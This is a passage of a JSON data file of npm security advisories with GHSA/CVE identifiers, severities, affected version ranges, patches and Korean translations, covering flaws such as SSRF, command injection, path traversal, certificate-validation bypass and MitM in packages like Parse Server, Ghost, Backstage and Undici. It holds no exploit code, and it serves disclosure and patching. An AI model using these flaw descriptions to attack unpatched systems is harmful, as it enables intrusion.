    "description": "### Impact\nThe certificate in Apple Game Center auth adapter not validated. As a result, authentication could potentially be bypassed by making a fake certificate accessible via certain Apple domains and providing the URL to that certificate in an authData object.\n\n### Patches\nTo prevent this, a new `rootCertificateUrl` property is introduced to the Parse Server Apple Game Center auth adapter which takes the URL to the root certificate of Apple's Game Center authentication certificate. If no value is set, the `rootCertificateUrl` property defaults to the URL of the [current root certificate](https://developer.apple.com/news/?id=stttq465) as of May 27, 2022.\n\nKeep in mind that the root certificate can change at any time (expected to be announced by Apple) and that it is the developer's responsibility to keep the root certificate URL up-to-date when using the Parse Server Apple Game Center auth adapter.\n\n### Workarounds\nNone.\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\n- https://developer.apple.com/news/?id=stttq465\n- https://github.com/parse-community/parse-server\n\n### More information\n* For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org) or [community chat](http://chat.parseplatform.org)\n* Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org)\n\n",
    "identifiers": "GHSA : GHSA-rh9j-f5f8-rvgc\nCVE : CVE-2022-31083",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:31Z",
    "publishedAt": "2022-06-17T22:09:09Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\nhttps://github.com/parse-community/parse-server/pull/8054/commits/0cc299f82e367518f2fe7a53b99f3f801a338cf4\nhttps://github.com/parse-community/parse-server/pull/8054/commits/2084b7c569697a5230e42511799eeac9219db5a9\nhttps://developer.apple.com/news/?id=stttq465\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31083\nhttps://github.com/parse-community/parse-server/pull/8054\nhttps://github.com/parse-community/parse-server/commit/ba2b0a9cb9a568817a114b132a4c2e0911d76df1\nhttps://github.com/advisories/GHSA-rh9j-f5f8-rvgc",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.11",
    "identifier": "4.10.11",
    "descriptionKR": "### 영향\nApple Game Center 인증 어댑터의 인증서가 확인되지 않았습니다. 결과적으로 특정 Apple 도메인을 통해 액세스할 수 있는 가짜 인증서를 만들고 authData 개체에 해당 인증서에 대한 URL을 제공하여 잠재적으로 인증을 우회할 수 있습니다.\n\n### 패치\n이를 방지하기 위해 Apple의 Game Center 인증 인증서의 루트 인증서에 대한 URL을 사용하는 Parse Server Apple Game Center 인증 어댑터에 새로운 `rootCertificateUrl` 속성이 도입되었습니다. 값이 설정되지 않은 경우 `rootCertificateUrl` 속성은 2022년 5월 27일 현재 [현재 루트 인증서](https://developer.apple.com/news/?id=stttq465)의 URL로 기본 설정됩니다.\n\n루트 인증서는 언제든지 변경될 수 있으며(Apple에서 발표할 것으로 예상됨) Parse Server Apple Game Center 인증 어댑터를 사용할 때 루트 인증서 URL을 최신 상태로 유지하는 것은 개발자의 책임임을 명심하십시오.\n\n### 해결 방법\n없음.\n\n### 참조\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\n- https://developer.apple.com/news/?id=stttq465\n- https://github.com/parse-community/parse-server\n\n### 추가 정보\n* 이 취약점에 대한 질문이나 의견이 있으시면 [커뮤니티 포럼](http://community.parseplatform.org) 또는 [커뮤니티 채팅](http://chat.parseplatform.org)을 방문하십시오.\n* [report.parseplatform.org](https://report.parseplatform.org)에서 다른 취약점을 보고하세요."
  },
  {
    "description": "Kity Minder v1.3.5 was discovered to contain a Server-Side Request Forgery (SSRF) via the init function at ImageCapture.class.php.",
    "identifiers": "GHSA : GHSA-q56h-x9h5-q53c\nCVE : CVE-2022-31830",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:03:49Z",
    "publishedAt": "2022-06-10T00:00:56Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-31830\nhttps://github.com/fex-team/kityminder/issues/345\nhttps://github.com/advisories/GHSA-q56h-x9h5-q53c",
    "name": "kityminder",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.3.5",
    "descriptionKR": "Kity Minder v1.3.5는 ImageCapture.class.php의 초기화 기능을 통해 SSRF(Server-Side Request Forgery)를 포함하는 것으로 발견되었습니다."
  },
  {
    "description": "The nestjs-proxy library did not have a way to block sensitive cookies (e.g. session cookies) from being forwarded to backend services configured by the application developer. This could have led to sensitive cookies being inadvertently exposed to such services that should not see them.\n\nThe patched version now blocks cookies from being forwarded by default. However developers can configure an allow-list of cookie names by using the `allowedCookies` config setting. Further details of this feature can be found in the library's README on [Github](https://github.com/Finastra/finastra-nodejs-libs/tree/develop/libs/proxy) or [NPM](https://www.npmjs.com/package/@finastra/nestjs-proxy).\n\n### Patches\n- This issue has been fixed in version 0.7.0 of `@finastra/nestjs-proxy`.\n- Users of `@ffdc/nestjs-proxy` are advised that this package has been deprecated and is no longer being maintained or receiving updates. Please update your package.json file to use `@finastra/nestjs-proxy` instead.\n\n### References\n- https://github.com/Finastra/finastra-nodejs-libs/pull/232\n- https://github.com/Finastra/finastra-nodejs-libs/blob/master/libs/proxy/README.md\n",
    "identifiers": "GHSA : GHSA-77mv-4rg7-r8qv\nCVE : CVE-2022-31070",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:20Z",
    "publishedAt": "2022-06-17T21:43:45Z",
    "references": "https://github.com/Finastra/finastra-nodejs-libs/security/advisories/GHSA-77mv-4rg7-r8qv\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31070\nhttps://github.com/Finastra/finastra-nodejs-libs/pull/232\nhttps://github.com/advisories/GHSA-77mv-4rg7-r8qv",
    "name": "@finastra/nestjs-proxy",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.7.0",
    "identifier": "0.7.0",
    "descriptionKR": "nestjs-proxy 라이브러리에는 민감한 쿠키(예: 세션 쿠키)가 애플리케이션 개발자가 구성한 백엔드 서비스로 전달되는 것을 차단하는 방법이 없었습니다. 이로 인해 중요한 쿠키가 표시되지 않아야 하는 서비스에 실수로 노출될 수 있습니다.\n\n패치된 버전은 이제 쿠키가 기본적으로 전달되는 것을 차단합니다. 그러나 개발자는 `allowedCookies` 구성 설정을 사용하여 쿠키 이름의 허용 목록을 구성할 수 있습니다. 이 기능에 대한 자세한 내용은 [Github](https://github.com/Finastra/finastra-nodejs-libs/tree/develop/libs/proxy) 또는 [NPM](https:// www.npmjs.com/package/@finastra/nestjs-proxy).\n\n### 패치\n- 이 문제는 `@finastra/nestjs-proxy` 버전 0.7.0에서 수정되었습니다.\n- `@ffdc/nestjs-proxy` 사용자는 이 패키지가 더 이상 사용되지 않으며 더 이상 유지 관리되지 않거나 업데이트를 받지 않는다는 점을 알려드립니다. 대신 `@finastra/nestjs-proxy`를 사용하도록 package.json 파일을 업데이트하세요.\n\n### 참조\n- https://github.com/Finastra/finastra-nodejs-libs/pull/232\n- https://github.com/Finastra/finastra-nodejs-libs/blob/master/libs/proxy/README.md"
  },
  {
    "description": "The nestjs-proxy library did not have a way to control when Authorization headers should should be forwarded for specific backend services configured by the application developer. This could have resulted in sensitive information such as OAuth bearer access tokens being inadvertently exposed to such services that should not see them.\n\nA new feature has been introduced in the patched version of nestjs-proxy that allows application developers to opt out of forwarding the Authorization headers on a per service basis using the `forwardToken` config setting. Developers are advised to review the README for this library on Github or NPM for further details on how this configuration can be applied.\n\n### Patches\n- This issue has been fixed in version 0.7.0 of `@finastra/nestjs-proxy`.\n- Users of `@ffdc/nestjs-proxy` are advised that this package has been deprecated and is no longer being maintained or receiving updates. Please update your package.json file to use `@finastra/nestjs-proxy` instead.\n\n### References\n- https://github.com/Finastra/finastra-nodejs-libs/pull/231\n- https://github.com/Finastra/finastra-nodejs-libs/blob/master/libs/proxy/README.md",
    "identifiers": "GHSA : GHSA-j562-c3cw-3p5g\nCVE : CVE-2022-31069",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:40Z",
    "publishedAt": "2022-06-17T21:39:48Z",
    "references": "https://github.com/Finastra/finastra-nodejs-libs/security/advisories/GHSA-j562-c3cw-3p5g\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31069\nhttps://github.com/Finastra/finastra-nodejs-libs/pull/231\nhttps://github.com/advisories/GHSA-j562-c3cw-3p5g",
    "name": "@finastra/nestjs-proxy",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.7.0",
    "identifier": "0.7.0",
    "descriptionKR": "nestjs-proxy 라이브러리에는 애플리케이션 개발자가 구성한 특정 백엔드 서비스에 대해 Authorization 헤더를 전달해야 하는 시기를 제어하는 ​​방법이 없었습니다. 이로 인해 OAuth 전달자 액세스 토큰과 같은 민감한 정보가 이러한 정보를 볼 수 없는 서비스에 실수로 노출될 수 있습니다.\n\n애플리케이션 개발자가 'forwardToken' 구성 설정을 사용하여 서비스별로 Authorization 헤더 전달을 옵트아웃할 수 있는 새로운 기능이 nestjs-proxy 패치 버전에 도입되었습니다. 개발자는 이 구성을 적용할 수 있는 방법에 대한 자세한 내용을 보려면 Github 또는 NPM에서 이 라이브러리에 대한 README를 검토하는 것이 좋습니다.\n\n### 패치\n- 이 문제는 `@finastra/nestjs-proxy` 버전 0.7.0에서 수정되었습니다.\n- `@ffdc/nestjs-proxy` 사용자는 이 패키지가 더 이상 사용되지 않으며 더 이상 유지 관리되지 않거나 업데이트를 받지 않는다는 점을 알려드립니다. 대신 `@finastra/nestjs-proxy`를 사용하도록 package.json 파일을 업데이트하세요.\n\n### 참조\n- https://github.com/Finastra/finastra-nodejs-libs/pull/231\n- https://github.com/Finastra/finastra-nodejs-libs/blob/master/libs/proxy/README.md"
  },
  {
    "description": "Prototype pollution vulnerability in '@strikeentco/set' version 1.0.0 allows attacker to cause a denial of service and may lead to remote code execution.",
    "identifiers": "GHSA : GHSA-wwg2-2crq-6grr\nCVE : CVE-2020-28267",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:39Z",
    "publishedAt": "2022-05-24T17:34:03Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28267\nhttps://github.com/strikeentco/set/commit/102cc6b2e1d1e0c928ced87e75df759d5541ff60\nhttps://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267\nhttps://github.com/advisories/GHSA-wwg2-2crq-6grr",
    "name": "@strikeentco/set",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.0",
    "identifier": "1.0.1",
    "descriptionKR": "'@strikeentco/set' 버전 1.0.0의 프로토타입 오염 취약성으로 인해 공격자가 서비스 거부를 유발하고 원격 코드 실행으로 이어질 수 있습니다."
  },
  {
    "description": "s2k.js in OpenPGP.js will decrypt arbitrary messages regardless of passphrase for crafted PGP keys which allows remote attackers to bypass authentication if message decryption is used as an authentication mechanism via a crafted symmetrically encrypted PGP message.",
    "identifiers": "GHSA : GHSA-qmvq-f3fj-m3wg\nCVE : CVE-2015-8013",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:48Z",
    "publishedAt": "2022-05-17T02:15:35Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2015-8013\nhttps://github.com/openpgpjs/openpgpjs/commit/668a9bbe7033f3f475576209305eb57a54306d29\nhttp://www.openwall.com/lists/oss-security/2015/10/30/5\nhttps://github.com/advisories/GHSA-qmvq-f3fj-m3wg",
    "name": "openpgp",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.0",
    "identifier": "1.3.0",
    "descriptionKR": "OpenPGP.js의 s2k.js는 메시지 복호화가 대칭적으로 암호화된 PGP 메시지를 통해 인증 메커니즘으로 사용되는 경우 원격 공격자가 인증을 우회할 수 있도록 하는 조작된 PGP 키의 암호에 관계없이 임의의 메시지를 해독합니다."
  },
  {
    "description": "giting version prior to 0.0.8 allows execution of arbritary commands. The first argument `repo` of function `pull()` is executed by the package without any validation.",
    "identifiers": "GHSA : GHSA-53xj-v576-3ch2\nCVE : CVE-2019-10802",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-03T05:06:03Z",
    "publishedAt": "2021-04-13T15:22:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10802\nhttps://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0\nhttps://snyk.io/vuln/SNYK-JS-GITING-559008\nhttps://github.com/advisories/GHSA-53xj-v576-3ch2",
    "name": "giting",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.8",
    "descriptionKR": "0.0.8 이전 버전에서는 임의의 명령을 실행할 수 있습니다. `pull()` 함수의 첫 번째 인수 `repo`는 검증 없이 패키지에 의해 실행됩니다."
  },
  {
    "description": "### Impact\n\nA [vulnerability](https://www.cve.org/CVERecord?id=CVE-2022-24785) in an upstream library means an authenticated attacker can abuse locale input to execute arbitrary commands from a file that has previously been uploaded using the file upload functionality in the post editor.\n\n### Patches\n\nFixed in 5.2.3, all 5.x sites should update as soon as possible.\nFixed in 4.48.2, all 4.x sites should update as soon as possible.\n\n### Workarounds\n\nPatched versions of Ghost add validation to the locale input to prevent execution of arbitrary files. Updating Ghost is the quickest complete solution.\n\nAs a workaround, if for any reason you cannot update your Ghost instance, you can block the `POST /ghost/api/admin/settings/` endpoint, which will also disable updating settings for your site.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Email us at [security@ghost.org](mailto:security@ghost.org)\n\n### Credits\n\n* devx00 - https://twitter.com/devx00",
    "identifiers": "GHSA : GHSA-7v28-g2pq-ggg8",
    "severity": "MODERATE",
    "updatedAt": "2023-01-06T05:07:50Z",
    "publishedAt": "2022-06-17T01:16:03Z",
    "references": "https://github.com/TryGhost/Ghost/security/advisories/GHSA-7v28-g2pq-ggg8\nhttps://github.com/advisories/GHSA-7v28-g2pq-ggg8",
    "name": "ghost",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.3",
    "identifier": "5.2.3",
    "descriptionKR": "### 영향\n\n업스트림 라이브러리의 [취약성](https://www.cve.org/CVERecord?id=CVE-2022-24785)은 인증된 공격자가 로케일 입력을 악용하여 이전에 업로드된 파일에서 임의의 명령을 실행할 수 있음을 의미합니다. 게시물 편집기의 파일 업로드 기능.\n\n### 패치\n\n5.2.3에서 수정되었으며 모든 5.x 사이트는 가능한 한 빨리 업데이트되어야 합니다.\n4.48.2에서 수정되었으며 모든 4.x 사이트는 가능한 한 빨리 업데이트되어야 합니다.\n\n### 해결 방법\n\n패치된 버전의 Ghost는 임의 파일의 실행을 방지하기 위해 로케일 입력에 유효성 검사를 추가합니다. Ghost 업데이트는 가장 빠르고 완벽한 솔루션입니다.\n\n이 문제를 해결하려면 어떤 이유로든 Ghost 인스턴스를 업데이트할 수 없는 경우 `POST /ghost/api/admin/settings/` 끝점을 차단하여 사이트에 대한 업데이트 설정도 비활성화할 수 있습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [security@ghost.org](mailto:security@ghost.org)로 이메일을 보내주세요.\n\n### 크레딧\n\n* devx00 - https://twitter.com/devx00"
  },
  {
    "description": "### Impact\n\nA [vulnerability](https://www.cve.org/CVERecord?id=CVE-2022-24785) in an upstream library means an authenticated attacker can abuse locale input to execute arbitrary commands from a file that has previously been uploaded using the file upload functionality in the post editor.\n\n### Patches\n\nFixed in 5.2.3, all 5.x sites should update as soon as possible.\nFixed in 4.48.2, all 4.x sites should update as soon as possible.\n\n### Workarounds\n\nPatched versions of Ghost add validation to the locale input to prevent execution of arbitrary files. Updating Ghost is the quickest complete solution.\n\nAs a workaround, if for any reason you cannot update your Ghost instance, you can block the `POST /ghost/api/admin/settings/` endpoint, which will also disable updating settings for your site.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Email us at [security@ghost.org](mailto:security@ghost.org)\n\n### Credits\n\n* devx00 - https://twitter.com/devx00",
    "identifiers": "GHSA : GHSA-7v28-g2pq-ggg8",
    "severity": "MODERATE",
    "updatedAt": "2023-01-06T05:07:50Z",
    "publishedAt": "2022-06-17T01:16:03Z",
    "references": "https://github.com/TryGhost/Ghost/security/advisories/GHSA-7v28-g2pq-ggg8\nhttps://github.com/advisories/GHSA-7v28-g2pq-ggg8",
    "name": "ghost",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.48.2",
    "identifier": "4.48.2",
    "descriptionKR": "### 영향\n\n업스트림 라이브러리의 [취약성](https://www.cve.org/CVERecord?id=CVE-2022-24785)은 인증된 공격자가 로케일 입력을 악용하여 이전에 업로드된 파일에서 임의의 명령을 실행할 수 있음을 의미합니다. 게시물 편집기의 파일 업로드 기능.\n\n### 패치\n\n5.2.3에서 수정되었으며 모든 5.x 사이트는 가능한 한 빨리 업데이트되어야 합니다.\n4.48.2에서 수정되었으며 모든 4.x 사이트는 가능한 한 빨리 업데이트되어야 합니다.\n\n### 해결 방법\n\n패치된 버전의 Ghost는 임의 파일의 실행을 방지하기 위해 로케일 입력에 유효성 검사를 추가합니다. Ghost 업데이트는 가장 빠르고 완벽한 솔루션입니다.\n\n이 문제를 해결하려면 어떤 이유로든 Ghost 인스턴스를 업데이트할 수 없는 경우 `POST /ghost/api/admin/settings/` 끝점을 차단하여 사이트에 대한 업데이트 설정도 비활성화할 수 있습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [security@ghost.org](mailto:security@ghost.org)로 이메일을 보내주세요.\n\n### 크레딧\n\n* devx00 - https://twitter.com/devx00"
  },
  {
    "description": "### Impact\nA malicious actor with the ability to register entities in the Software Catalog is able to write files to arbitrary paths on the techdocs backend host instance when `techdocs.publisher.type` is set to `local`.\n\nThis vulnerability is mitigated by the fact that the Software Catalog must be configured with non-standard field format validators and/or non-standard entity policies.\n\n### Patches\nThose affected are advised to upgrade to `@backstage/plugin-techdocs-node` version `1.1.2` or higher.\n\n### Workarounds\nIf patching or upgrading is not possible, it would be sufficient to update any custom Catalog field format validators and/or custom entity policies to disallow entity names, kinds, and namespaces containing `..`\n\n<!--\n### References\ntodo: Link to blog post / published report.\n-->\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in the [Backstage repository](https://github.com/backstage/backstage)\n- Visit our chat, linked to in the [Backstage README](https://github.com/backstage/backstage)",
    "identifiers": "GHSA : GHSA-4jqc-jvh2-pxg9",
    "severity": "MODERATE",
    "updatedAt": "2023-01-12T05:01:02Z",
    "publishedAt": "2022-06-17T01:11:10Z",
    "references": "https://github.com/backstage/backstage/security/advisories/GHSA-4jqc-jvh2-pxg9\nhttps://github.com/backstage/backstage/commit/429c9f9daa5654dd1b996aa85f7264eb23a2e4fa\nhttps://github.com/advisories/GHSA-4jqc-jvh2-pxg9",
    "name": "@backstage/techdocs-common",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.11.16",
    "identifier": "0.11.16",
    "descriptionKR": "### 영향\n소프트웨어 카탈로그에 엔티티를 등록할 수 있는 악의적인 행위자는 `techdocs.publisher.type`이 `local`로 설정된 경우 techdocs 백엔드 호스트 인스턴스의 임의 경로에 파일을 쓸 수 있습니다.\n\n이 취약점은 소프트웨어 카탈로그가 비표준 필드 형식 유효성 검사기 및/또는 비표준 엔터티 정책으로 구성되어야 한다는 사실에 의해 완화됩니다.\n\n### 패치\n영향을 받는 사용자는 `@backstage/plugin-techdocs-node` 버전 `1.1.2` 이상으로 업그레이드하는 것이 좋습니다.\n\n### 해결 방법\n패치 또는 업그레이드가 불가능한 경우 '..'를 포함하는 엔터티 이름, 종류 및 네임스페이스를 허용하지 않도록 사용자 지정 카탈로그 필드 형식 유효성 검사기 및/또는 사용자 지정 엔터티 정책을 업데이트하는 것으로 충분합니다.\n\n<!--\n### 참조\ntodo: 블로그 게시물/게시된 보고서에 대한 링크입니다.\n-->\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [Backstage 저장소](https://github.com/backstage/backstage)에서 이슈 열기\n- [Backstage README](https://github.com/backstage/backstage)에 링크된 채팅을 방문하세요."
  },
  {
    "description": "### Impact\nA malicious actor with the ability to register entities in the Software Catalog is able to write files to arbitrary paths on the techdocs backend host instance when `techdocs.publisher.type` is set to `local`.\n\nThis vulnerability is mitigated by the fact that the Software Catalog must be configured with non-standard field format validators and/or non-standard entity policies.\n\n### Patches\nThose affected are advised to upgrade to `@backstage/plugin-techdocs-node` version `1.1.2` or higher.\n\n### Workarounds\nIf patching or upgrading is not possible, it would be sufficient to update any custom Catalog field format validators and/or custom entity policies to disallow entity names, kinds, and namespaces containing `..`\n\n<!--\n### References\ntodo: Link to blog post / published report.\n-->\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in the [Backstage repository](https://github.com/backstage/backstage)\n- Visit our chat, linked to in the [Backstage README](https://github.com/backstage/backstage)",
    "identifiers": "GHSA : GHSA-4jqc-jvh2-pxg9",
    "severity": "MODERATE",
    "updatedAt": "2023-01-12T05:01:02Z",
    "publishedAt": "2022-06-17T01:11:10Z",
    "references": "https://github.com/backstage/backstage/security/advisories/GHSA-4jqc-jvh2-pxg9\nhttps://github.com/backstage/backstage/commit/429c9f9daa5654dd1b996aa85f7264eb23a2e4fa\nhttps://github.com/advisories/GHSA-4jqc-jvh2-pxg9",
    "name": "@backstage/plugin-techdocs-node",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.2",
    "identifier": "1.1.2",
    "descriptionKR": "### 영향\n소프트웨어 카탈로그에 엔티티를 등록할 수 있는 악의적인 행위자는 `techdocs.publisher.type`이 `local`로 설정된 경우 techdocs 백엔드 호스트 인스턴스의 임의 경로에 파일을 쓸 수 있습니다.\n\n이 취약점은 소프트웨어 카탈로그가 비표준 필드 형식 유효성 검사기 및/또는 비표준 엔터티 정책으로 구성되어야 한다는 사실에 의해 완화됩니다.\n\n### 패치\n영향을 받는 사용자는 `@backstage/plugin-techdocs-node` 버전 `1.1.2` 이상으로 업그레이드하는 것이 좋습니다.\n\n### 해결 방법\n패치 또는 업그레이드가 불가능한 경우 '..'를 포함하는 엔터티 이름, 종류 및 네임스페이스를 허용하지 않도록 사용자 지정 카탈로그 필드 형식 유효성 검사기 및/또는 사용자 지정 엔터티 정책을 업데이트하는 것으로 충분합니다.\n\n<!--\n### 참조\ntodo: 블로그 게시물/게시된 보고서에 대한 링크입니다.\n-->\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [Backstage 저장소](https://github.com/backstage/backstage)에서 이슈 열기\n- [Backstage README](https://github.com/backstage/backstage)에 링크된 채팅을 방문하세요."
  },
  {
    "description": "### Description\n\n`Undici.ProxyAgent` never verifies the remote server's certificate, and always exposes all request & response data to the proxy. This unexpectedly means that proxies can MitM all HTTPS traffic, and if the proxy's URL is HTTP then it also means that nominally HTTPS requests are actually sent via plain-text HTTP between Undici and the proxy server.\n\n### Impact\n\nThis affects all use of HTTPS via HTTP proxy using **`Undici.ProxyAgent`**  with Undici or Node's global `fetch`. In this case, it removes all HTTPS security from all requests sent using Undici's `ProxyAgent`, allowing trivial MitM attacks by anybody on the network path between the client and the target server (local network users, your ISP, the proxy, the target server's ISP, etc).\nThis less seriously affects HTTPS via HTTPS proxies. When you send HTTPS via a proxy to a remote server, the proxy can freely view or modify all HTTPS traffic unexpectedly (but only the proxy). \n\n### Patches\n\nThis issue was patched in Undici v5.5.1.\n\n### Workarounds\n\nAt the time of writing, the only workaround is to not use `ProxyAgent` as a dispatcher for TLS Connections.",
    "identifiers": "GHSA : GHSA-pgw7-wx7w-2w33\nCVE : CVE-2022-32210",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:04:30Z",
    "publishedAt": "2022-06-17T01:02:29Z",
    "references": "https://github.com/nodejs/undici/security/advisories/GHSA-pgw7-wx7w-2w33\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-32210\nhttps://hackerone.com/reports/1583680\nhttps://github.com/advisories/GHSA-pgw7-wx7w-2w33",
    "name": "undici",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.8.2, <= 5.5.0",
    "identifier": "5.5.1",
    "descriptionKR": "### 설명\n\n`Undici.ProxyAgent`는 원격 서버의 인증서를 절대 확인하지 않으며 항상 모든 요청 및 응답 데이터를 프록시에 노출합니다. 이것은 예기치 않게 프록시가 모든 HTTPS 트래픽을 MitM할 수 있음을 의미하며 프록시의 URL이 HTTP인 경우 명목상 HTTPS 요청이 실제로 Undici와 프록시 서버 간에 일반 텍스트 HTTP를 통해 전송됨을 의미합니다.\n\n### 영향\n\n이는 Undici 또는 Node의 글로벌 `fetch`와 함께 **`Undici.ProxyAgent`**를 사용하는 HTTP 프록시를 통한 모든 HTTPS 사용에 영향을 미칩니다. 이 경우 Undici의 'ProxyAgent'를 사용하여 전송된 모든 요청에서 모든 HTTPS 보안을 제거하여 클라이언트와 대상 서버 사이의 네트워크 경로에 있는 모든 사람(로컬 네트워크 사용자, ISP, 프록시, 대상 서버의 ISP 등).\n이는 HTTPS 프록시를 통한 HTTPS에 덜 심각한 영향을 미칩니다. 프록시를 통해 HTTPS를 원격 서버로 보낼 때 프록시는 예기치 않게 모든 HTTPS 트래픽을 자유롭게 보거나 수정할 수 있습니다(단, 프록시만).\n\n### 패치\n\n이 문제는 Undici v5.5.1에서 패치되었습니다.\n\n### 해결 방법\n\n작성 당시 유일한 해결 방법은 'ProxyAgent'를 TLS 연결용 디스패처로 사용하지 않는 것입니다."
  },
  {
    "description": "The package jpeg-js before 0.4.4 is vulnerable to Denial of Service (DoS) where a particular piece of input will cause the program to enter an infinite loop and never return.",
    "identifiers": "GHSA : GHSA-xvf7-4v9q-58w6\nCVE : CVE-2022-25851",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:30Z",
    "publishedAt": "2022-06-11T00:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25851\nhttps://github.com/jpeg-js/jpeg-js/issues/105\nhttps://github.com/jpeg-js/jpeg-js/pull/106/\nhttps://github.com/jpeg-js/jpeg-js/commit/9ccd35fb5f55a6c4f1902ac5b0f270f675750c27\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2860295\nhttps://snyk.io/vuln/SNYK-JS-JPEGJS-2859218\nhttps://github.com/advisories/GHSA-xvf7-4v9q-58w6",
    "name": "jpeg-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.4.4",
    "identifier": "0.4.4",
    "descriptionKR": "0.4.4 이전의 jpeg-js 패키지는 특정 입력 부분으로 인해 프로그램이 무한 루프에 들어가 반환되지 않는 서비스 거부(DoS)에 취약합니다."
  },
  {
    "description": "The package convert-svg-core before 0.6.4 is vulnerable to Directory Traversal due to improper sanitization of SVG tags. Exploiting this vulnerability is possible by using a specially crafted SVG file.",
    "identifiers": "GHSA : GHSA-5f47-rcg5-9m24\nCVE : CVE-2022-24278",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:49Z",
    "publishedAt": "2022-06-11T00:00:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24278\nhttps://github.com/neocotic/convert-svg/issues/86\nhttps://github.com/neocotic/convert-svg/pull/87\nhttps://github.com/neocotic/convert-svg/commit/2bbc498c5029238637206661dbac9e44d37d17c5\nhttps://snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2859830\nhttps://github.com/advisories/GHSA-5f47-rcg5-9m24",
    "name": "convert-svg-core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.6.4",
    "identifier": "0.6.4",
    "descriptionKR": "0.6.4 이전의 패키지 convert-svg-core는 SVG 태그의 부적절한 삭제로 인해 디렉터리 순회에 취약합니다. 특수 제작된 SVG 파일을 사용하면 이 취약점을 악용할 수 있습니다."
  },
  {
    "description": "All versions of package git-promise is vulnerable to Command Injection due to an inappropriate fix of a prior [vulnerability](https://security.snyk.io/vuln/SNYK-JS-GITPROMISE-567476) in this package. **Note:** Please note that the vulnerability will not be fixed. The README file was updated with a warning regarding this issue. \n### Credits\n @lirantal for discovering this vulnerability.",
    "identifiers": "GHSA : GHSA-chj3-f7xw-367m\nCVE : CVE-2022-24376",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T05:01:41Z",
    "publishedAt": "2022-06-11T00:00:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24376\nhttps://gist.github.com/lirantal/9da1fceb32f5279eb76a5fc1cb9707dd\nhttps://snyk.io/vuln/SNYK-JS-GITPROMISE-2434310\nhttps://github.com/lirantal/git-promise/commit/030e4f993f3b65419d60f7f60e81e0a742b72e77\nhttps://github.com/advisories/GHSA-chj3-f7xw-367m",
    "name": "git-promise",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "패키지 git-promise의 모든 버전은 이 패키지의 이전 [취약점](https://security.snyk.io/vuln/SNYK-JS-GITPROMISE-567476)의 부적절한 수정으로 인해 명령 주입에 취약합니다. **참고:** 취약점은 수정되지 않습니다. README 파일은 이 문제에 대한 경고로 업데이트되었습니다.\n### 크레딧\n 이 취약점을 발견한 @lirantal."
  },
  {
    "description": "The package convert-svg-core before 0.6.3 are vulnerable to Arbitrary Code Injection when using a specially crafted SVG file. An attacker can read arbitrary files from the file system and then show the file content as a converted PNG file.",
    "identifiers": "GHSA : GHSA-54px-mhwv-5v8x\nCVE : CVE-2022-24429",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:41Z",
    "publishedAt": "2022-06-11T00:00:17Z",
